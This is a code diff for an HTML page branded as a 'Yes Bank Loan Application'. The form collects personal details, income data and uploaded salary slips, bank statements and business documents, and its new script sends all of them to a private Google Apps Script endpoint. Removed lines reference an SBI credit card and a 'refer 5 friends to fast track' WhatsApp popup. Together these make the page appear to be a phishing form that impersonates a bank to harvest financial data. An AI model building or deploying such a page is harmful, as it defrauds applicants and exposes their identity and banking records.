@@ -179,18 +179,9 @@
       <h2>Yes Bank Loan Application</h2>
     </div>
 
-    <!-- Personal Information Section -->
+ 
     <div class="form-section">
       <h3>Personal Information</h3>
-     <div class="form-group">
-      <label for="Loan type">Loan Type</label>
-       <select id="Loan Type" name="Loan Type" onchange="toggleLoantype()" required>
-      <option value="select">Select</option>
-      <option value="Home Loan">Home Loan</option>
-    <option value="Personal Loan">Personal Loan</option>
-  <option value="Buisiness Loan">Buisiness Loan</option>
-  </select>
-     </div>
       <div class="form-group">
         <label for="email">Email Address</label>
         <input type="email" id="email" name="email" required />
@@ -233,7 +224,7 @@
   <label for="sameAddress">Same as Permanent Address</label></div></div>
 
   <h3>Current Address</h3>
-  <textarea id="currentAddress" rows="4" placeholder="Enter current address here"></textarea>
+  <textarea id="currentAddress" rows="4"  name="currentAddress" placeholder="Enter current address here"></textarea>
 
         <label for="pincode">Pincode</label>
         <input type="text" id="pincode" name="pincode" required />
@@ -258,11 +249,10 @@
 
         <label for="monthlyIncome">Monthly Income (Optional)</label>
         <input type="text" id="monthlyIncome" name="monthlyIncome" placeholder="Optional"/>
-      
         <label for="refer by">Refer By</label>
         <input type="text" id="Refer By" name="Refer By" placeholder="optional"/>
-      
       </div>
+      
     </div>
 
     <!-- Salaried Additional Details -->
@@ -296,12 +286,6 @@
           <div class="form-section">
       <h3>Documents Required</h3>
 
-        <label for="panCardSalaried">PAN Card</label>
-        <input type="file" id="panCardSalaried" name="panCardSalaried" accept=".pdf,.jpg,.jpeg,.png" />
-
-        <label for="aadhaarCardSalaried">Aadhaar Card</label>
-        <input type="file" id="aadhaarCardSalaried" name="aadhaarCardSalaried" accept=".pdf,.jpg,.jpeg,.png" />
-
         <label for="salarySlips">Last 3 Months' Salary Slips</label>
         <input type="file" id="salarySlips" name="salarySlips" multiple accept=".pdf,.jpg,.jpeg,.png" />
 
@@ -334,14 +318,8 @@
         </div>
        <div class="form-section">
        <h3>Documents Required </h3>
-
-        <label for="aadhaarCardSelf">Aadhaar Card (front side)(Mandatory)</label>
-        <input type="file" id="aadhaarCardSelf" name="aadhaarCardSelf" accept=".pdf,.jpg,.jpeg,.png" />
-        <label for="aadhaarCardSelf">Pan Card(Mandatory)</label>
-        <input type="file" id="aadhaarCardSelf" name="aadhaarCardSelf" accept=".pdf,.jpg,.jpeg,.png" />
-<label for="aadhaarCardSelf">Aadhaar Card (backside)(Mandatory)</label>
-        <input type="file" id="aadhaarCardSelf" name="aadhaarCardSelf" accept=".pdf,.jpg,.jpeg,.png" />
-
+       
+      
         <label for="businessProofType">Business Proof (Any One)</label>
         <select id="businessProofType" name="businessProofType">
           <option value="">Select</option>
@@ -353,81 +331,98 @@
         <input type="file" id="businessProofFile" name="businessProofFile" accept=".pdf,.jpg,.jpeg,.png" />
       </div>
     </div>
-
-  
-
-    <button type="submit">Submit Application</button>
+   <button type="submit">Submit Application</button>
     <p id="responseMsg"></p>
   </form>
 
-  <!-- Share Popup -->
-  <div id="sharePopup" style="display: none; text-align: center; margin: 20px auto; max-width: 900px;">
-    <h3>Success! Refer 5 Friends or Family to Fast Track Your Application</h3>
-    <p>Click below to share via WhatsApp:</p>
-    <a href="https://wa.me/?text=I%20just%20applied%20for%20the%20SBI%20Simply%20SAVE%20UPI%20Credit%20Card.%20Check%20it%20out!" target="_blank" rel="noopener noreferrer">
-      <button style="padding: 10px 20px; font-size: 16px; background-color: #25D366; color: white; border: none; border-radius: 5px; cursor: pointer;">
-        Share on WhatsApp
-      </button>
-    </a>
-  </div>
+<script>
+  // Copy permanent address to current if checkbox is selected
+  function copyAddress() {
+    const permanentAddress = document.getElementById('permanentAddress').value;
+    document.getElementById('currentAddress').value =
+      document.getElementById('sameAddress').checked ? permanentAddress : '';
+  }
 
-  <script>
-    function toggleLoantype() {
-      const employmentType = document.getElementById('LoanType').value;
+  // Toggle form sections based on employment type
+  function toggleEmploymentFields() {
+    const employmentType = document.getElementById('employmentType').value;
+    document.getElementById('salariedFields').classList.add('hidden');
+    document.getElementById('selfEmployedFields').classList.add('hidden');
+
+    if (employmentType === 'Salaried') {
+      document.getElementById('salariedFields').classList.remove('hidden');
+    } else if (employmentType === 'Self-Employed') {
+      document.getElementById('selfEmployedFields').classList.remove('hidden');
     }
-    function toggleEmploymentFields() {
-      const employmentType = document.getElementById('employmentType').value;
-      const salariedFields = document.getElementById('salariedFields');
-      const selfEmployedFields = document.getElementById('selfEmployedFields');
+  }
 
-      if (employmentType === 'Salaried') {
-        salariedFields.classList.remove('hidden');
-        selfEmployedFields.classList.add('hidden');
-      } else if (employmentType === 'Self-Employed') {
-        salariedFields.classList.add('hidden');
-        selfEmployedFields.classList.remove('hidden');
-      } else {
-        salariedFields.classList.add('hidden');
-        selfEmployedFields.classList.add('hidden');
-      }
-    }
+  // Form submission with files
+ document.getElementById("loanForm").addEventListener("submit", async function (e) {
+  e.preventDefault();
+  const form = e.target;
+  const formData = new FormData(form);
 
-    const form = document.getElementById('loanForm');
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
+  const uploadFields = ["salarySlips", "bankStatement", "businessProofFile"];
+const folderMap = {
+    salarySlips: "SalarySlipsForLoan",
+    bankStatement: "BankStatementForLoan",
+    businessProofFile: "BusinessProofForLoan"
+  };
+  const uploadedLinks = {};
 
-      const formData = new FormData(form);
+  for (const name of uploadFields) {
+    const fileInput = document.querySelector(`[name="${name}"]`);
+    if (!fileInput || !fileInput.files.length) continue;
 
-      // Replace YOUR_WEB_APP_URL with the actual URL for submission
-      const res = await fetch('YOUR_WEB_APP_URL', {
-        method: 'POST',
-        body: formData,
+    const urls = [];
+    for (const file of fileInput.files) {
+      const base64 = await toBase64(file);
+      const response = await fetch("https://script.google.com/macros/s/AKfycbyEuC3AhK9mGtrifzuyuTe27KLCFf62HiMx16v1rPYoTBboJB_OZaqMTBk-IBpAYkpNRA/exec", {
+        method: "POST",
+        body: new URLSearchParams({
+          media: base64,
+          fileName: file.name,
+          fileType: name,
+          folderName: folderMap[name]
+        }),
       });
+      const result = await response.json();
+      urls.push(result.url);
+    }
 
-      const result = await res.json();
-      const responseMsg = document.getElementById('responseMsg');
-      responseMsg.innerText = result.success ? "✅ Submitted Successfully!" : "❌ Submission Failed!";
-      if(result.success) {
-        form.reset();
-        toggleEmploymentFields();
-        setTimeout(() => {
-          document.getElementById('sharePopup').style.display = 'block';
-        }, 1000);
-      }
+    uploadedLinks[name + "Link"] = urls.join(", ");
+  }
+
+  for (const [key, value] of Object.entries(uploadedLinks)) {
+    formData.append(key, value);
+  }
+
+  const payload = new URLSearchParams([...formData.entries()]);
+
+  fetch("https://script.google.com/macros/s/AKfycbyEuC3AhK9mGtrifzuyuTe27KLCFf62HiMx16v1rPYoTBboJB_OZaqMTBk-IBpAYkpNRA/exec", {
+    method: "POST",
+    body: payload
+  })
+    .then((res) => res.text())
+    .then((msg) => {
+      document.getElementById("responseMsg").innerText = msg;
+    })
+    .catch((err) => {
+      document.getElementById("responseMsg").innerText = "Error: " + err;
     });
-     function copyAddress() {
-      var permanentAddress = document.getElementById("permanentAddress").value;
-      var currentAddressField = document.getElementById("currentAddress");
-      var checkBox = document.getElementById("sameAddress");
+});
 
-      if (checkBox.checked) {
-        currentAddressField.value = permanentAddress;
-        currentAddressField.readOnly = true;  // Optionally make it read-only
-      } else {
-        currentAddressField.value = "";
-        currentAddressField.readOnly = false;
-      }}
-  </script>
+function toBase64(file) {
+  return new Promise((resolve, reject) => {
+    const reader = new FileReader();
+    reader.onloadend = () => resolve(reader.result.split(",")[1]);
+    reader.onerror = reject;
+    reader.readAsDataURL(file);
+  });
+}
+
+</script>
+
   </body>
 </body>
 </html>
